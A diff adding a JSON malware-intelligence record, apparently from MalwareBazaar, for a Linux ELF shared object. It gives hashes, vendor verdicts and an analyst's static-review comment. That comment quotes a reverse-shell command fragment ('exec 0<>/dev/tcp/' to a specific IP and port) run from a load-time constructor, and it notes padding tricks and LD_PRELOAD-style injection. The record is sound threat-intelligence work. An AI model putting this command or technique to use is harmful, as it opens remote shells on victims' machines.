@@ -1,0 +1,106 @@
+{
+  "hashes": {
+    "sha256": "9921760098f8c5164cb845b82dcb4c748a8e92e5b890df6a78c652c96be6189b",
+    "sha1": "7aa97f03824668e1488b43e7fa0e890d8806ae1d",
+    "md5": "1669b744f31c2c6678b98c2717c08ffd",
+    "sha3_384": "c10a3b46182400a4deca05e187545d80e84b45189fd320f30f143cf1ee4b64b2cee2867ab116eee297e5d1a6d39fca96",
+    "tlsh": "T168257756E3E0DD6BDA7C573D2E8F037073B2E804A2EA572310515E300E433946B6698A",
+    "imphash": null,
+    "telfhash": null,
+    "gimphash": null,
+    "ssdeep": "96:RPkJ71H8bO4x8PkJ71H8bO4x8PkJ71H8bO4xa:Rmnmnmp"
+  },
+  "file_metadata": {
+    "names": [
+      "zz2996.so"
+    ],
+    "mime_type": "application/x-sharedlib",
+    "type": "elf",
+    "size": 1036800,
+    "format": "ELF",
+    "arch": "X86_64",
+    "info": null,
+    "magika": "elf",
+    "trid": [
+      "50.1% (.) ELF Executable and Linkable format (Linux) (4022\/12)",
+      "49.8% (.O) ELF Executable and Linkable format (generic) (4000\/1)"
+    ],
+    "file_information": null,
+    "ole_information": []
+  },
+  "intelligence": {
+    "signature": null,
+    "tags": [
+      "elf"
+    ],
+    "comments": [
+      {
+        "id": "515150",
+        "date_added": "2026-10-25 09:45:53",
+        "twitter_handle": null,
+        "display_name": null,
+        "comment": "Static review, 2026-10-25 UTC. Despite clean/legit verdicts from several engines, this is a malicious ELF64 x86-64 shared object (1,036,800 bytes). The real object is ~12.8 KB: 0x75 bytes of .text run from .init_array (a load-time constructor) and pass a plaintext .rodata command to /bin/sh: setsid bash with exec 0\u003c\u003e/dev/tcp/85.11.167.7/15077, i.e. an interactive reverse shell (PTY via script -qc). The file is then three identical copies of the object separated by ~331,736-byte runs of 0x80 padding, inflating size (overall entropy ~0.27). Built with GCC 11.4.0 (Ubuntu 22.04). Fits LD_PRELOAD/library-injection use. Endpoint matches ThreatFox 1984360. Not executed; endpoint not contacted."
+      }
+    ],
+    "vendor_intel": {
+      "CERT-PL_MWDB": {
+        "detection": null,
+        "link": "https:\/\/mwdb.cert.pl\/sample\/9921760098f8c5164cb845b82dcb4c748a8e92e5b890df6a78c652c96be6189b\/"
+      },
+      "FileScan-IO": {
+        "verdict": "UNKNOWN",
+        "threatlevel": "0.0",
+        "confidence": "1.0",
+        "report_link": "https:\/\/www.filescan.io\/uploads\/6adda0547cb2a3386f835ce9\/reports\/46b99a80-2005-4c94-b92c-0ac9d5a31480\/overview"
+      },
+      "Intezer": {
+        "verdict": "not_supported",
+        "family_name": null,
+        "analysis_url": "https:\/\/analyze.intezer.com\/analyses\/6bda97e7-cbf0-4168-8418-ea6466d0f622?utm_source=MalwareBazaar"
+      },
+      "ReversingLabs": {
+        "threat_name": null,
+        "status": "UNKNOWN",
+        "first_seen": null,
+        "scanner_count": null,
+        "scanner_match": null,
+        "scanner_percent": null
+      },
+      "Spamhaus_HBL": [
+        {
+          "detection": "suspicious",
+          "link": "https:\/\/www.spamhaus.org\/hbl\/"
+        }
+      ],
+      "Triage": {
+        "malware_family": null,
+        "score": "1",
+        "link": "https:\/\/tria.ge\/reports\/261025-g5xgmafz7j\/",
+        "tags": [
+          "linux"
+        ],
+        "signatures": [],
+        "malware_config": []
+      },
+      "YOROI_YOMI": {
+        "detection": "Legit File",
+        "score": "0.00"
+      },
+      "vxCube": {
+        "verdict": "clean1",
+        "maliciousness": "0",
+        "behaviour": []
+      }
+    }
+  },
+  "submission": {
+    "reporter": "Leavii",
+    "anonymous": false,
+    "origin_country": "US"
+  },
+  "sources": [
+    "MalwareBazaar (abuse.ch)"
+  ],
+  "first_seen": "2026-10-25T04:15:30Z",
+  "last_seen": null
+}
